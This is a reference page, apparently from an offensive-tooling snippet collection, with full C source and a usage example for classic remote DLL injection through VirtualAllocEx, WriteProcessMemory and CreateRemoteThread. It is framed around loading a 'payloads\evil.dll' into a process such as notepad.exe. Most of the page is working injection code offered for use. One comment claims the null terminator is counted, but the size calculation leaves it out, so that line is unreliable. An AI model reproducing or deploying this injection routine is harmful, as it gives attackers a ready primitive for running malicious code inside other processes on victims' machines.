## Remote DLL Injection via CreateRemoteThread

Injects a DLL into a remote process by resolving the address of `LoadLibraryW` from `kernel32.dll`, allocating memory inside the target process with `VirtualAllocEx`, writing the DLL path into that allocation with `WriteProcessMemory`, and finally spawning a new thread in the remote process via `CreateRemoteThread` with `LoadLibraryW` as its entry point and the DLL path as its argument. The remote thread calls `LoadLibraryW`, which maps the DLL and triggers its `DllMain`.

**Usage**

Call `InjectDllToRemoteProcess` with a valid `PROCESS_ALL_ACCESS` handle to the target process and the full wide-character path to the DLL on disk.

- `IN HANDLE hProcess`  A `PROCESS_ALL_ACCESS` handle to the target remote process; obtained from `OpenProcess` or `GetRemoteProcessHandle`.
- `IN LPWSTR DllName`  Full wide-character path to the DLL file to inject (e.g. `L"C:\\payloads\\evil.dll"`).

**Return Value**

`BOOL`  Returns `TRUE` if the DLL was successfully written and the remote thread was created, otherwise `FALSE`.

**External Files**

- `windows.h`  `HANDLE`, `LPWSTR`, `LPVOID`, `BOOL`, `DWORD`, `SIZE_T`, `IN`, `VirtualAllocEx()`, `WriteProcessMemory()`, `CreateRemoteThread()`, `GetProcAddress()`, `GetModuleHandle()`, `CloseHandle()`, `GetLastError()`
- `stdio.h`  `printf()`


### Code

```c
#include <windows.h>
#include <stdio.h>


BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName)
{
    BOOL    bSTATE                  = TRUE;

    LPVOID  pLoadLibraryW           = NULL;
    LPVOID  pAddress                = NULL;

    // Calculate the byte size of the DLL path string including the null terminator.
    DWORD   dwSizeToWrite           = lstrlenW(DllName) * sizeof(WCHAR);

    SIZE_T  lpNumberOfBytesWritten  = NULL;

    HANDLE  hThread                 = NULL;

    // Resolve the address of LoadLibraryW from kernel32.dll.
    // The address is identical in the remote process because kernel32.dll
    // is always mapped at the same base address across processes.
    pLoadLibraryW = GetProcAddress(
        GetModuleHandle(L"kernel32.dll"),   // kernel32.dll is loaded in every process.
        "LoadLibraryW"                      // Wide-char variant to support Unicode DLL paths.
    );
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Allocate RW memory in the remote process large enough to hold the DLL path.
    pAddress = VirtualAllocEx(
        hProcess,               // Handle to the target remote process.
        NULL,                   // Let the OS choose the base address.
        dwSizeToWrite,          // Size of the DLL path string in bytes.
        MEM_COMMIT | MEM_RESERVE, // Reserve and commit pages in one call.
        PAGE_READWRITE          // RW is sufficient; the path is data, not code.
    );
    if (pAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    printf("[i] pAddress Allocated At : 0x%p Of Size : %d \n", pAddress, dwSizeToWrite);

    // Write the DLL path into the allocated buffer inside the remote process.
    if (!WriteProcessMemory(
        hProcess,                       // Handle to the target remote process.
        pAddress,                       // Destination: the remotely allocated buffer.
        DllName,                        // Source: the DLL path string.
        dwSizeToWrite,                  // Number of bytes to write.
        &lpNumberOfBytesWritten         // Receives the number of bytes actually written.
    ) || lpNumberOfBytesWritten != dwSizeToWrite) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    printf("[i] Successfully Written %d Bytes \n", lpNumberOfBytesWritten);

    // Create a thread in the remote process with LoadLibraryW as its entry point.
    // Passing pAddress as lpParameter causes the remote thread to call
    // LoadLibraryW(DllName), which maps the DLL and fires its DllMain.
    hThread = CreateRemoteThread(
        hProcess,           // Handle to the target remote process.
        NULL,               // Default security attributes.
        NULL,               // Default stack size.
        pLoadLibraryW,      // Thread entry: address of LoadLibraryW in the remote process.
        pAddress,           // Argument to LoadLibraryW: the remote DLL path buffer.
        NULL,               // Run immediately.
        NULL                // Thread ID not required.
    );
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    printf("[+] DLL Injection Succeeded \n");

_EndOfFunction:
    if (hThread)
        CloseHandle(hThread);
    return bSTATE;
}
```

**Example**

```c
DWORD  dwProcessId = 0;
HANDLE  hProcess    = NULL;

// Open the target process — must include PROCESS_VM_OPERATION + PROCESS_CREATE_THREAD.
GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess);

// Inject the DLL into the remote process via a LoadLibraryW thread.
InjectDllToRemoteProcess(hProcess, (LPWSTR)L"C:\\payloads\\PayloadDll.dll");

CloseHandle(hProcess);
```
